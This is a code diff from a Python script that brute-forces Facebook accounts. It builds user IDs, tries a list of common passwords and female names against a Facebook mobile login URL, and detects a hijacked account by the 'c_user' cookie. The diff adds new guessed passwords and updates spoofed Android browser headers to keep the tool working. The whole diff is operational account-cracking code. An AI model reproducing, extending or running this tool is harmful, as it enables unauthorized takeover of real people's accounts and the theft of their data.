@@ -154,7 +154,7 @@ def fuck():
         print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
         for love in user:
             uid = code+name+cod+love
-            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'i love you','iloveyou','102030','203040','304050','405060','506070','607080','708090','jannat','Jannat','nusrat','Nusrat','sadiya','Sadiya','sumaiya','Sumaiya','fariya','Fariya','jannatul','Jannatul','Mimmim','mimmim']
+            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'i love you','iloveyou','102030','203040','304050','405060','506070','607080','708090','jannat','Jannat','nusrat','Nusrat','sadiya','Sadiya','sumaiya','Sumaiya','fariya','Fariya','jannatul','Jannatul','Mimmim','mimmim','2023','20242024']
             yaari.submit(DEVHIS2,uid,pwx,tl)
     print('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     print(' ┏━[•] Crack process has been completed')
@@ -183,23 +183,27 @@ def DEVHIS2(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.alpha.facebook.com',
+            header_freefb = {'authority': 'x.facebook.com',
     'method': 'GET',
     'scheme': 'https',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8',
     'cache-control': 'max-age=0',
+    'dpr': '2.5562500953674316',
     'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
     'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"SM-N980F"',
     'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"13.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 11; Mi A3 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36',}
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',}
             lo = session.post('https://mbasic.alpha.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
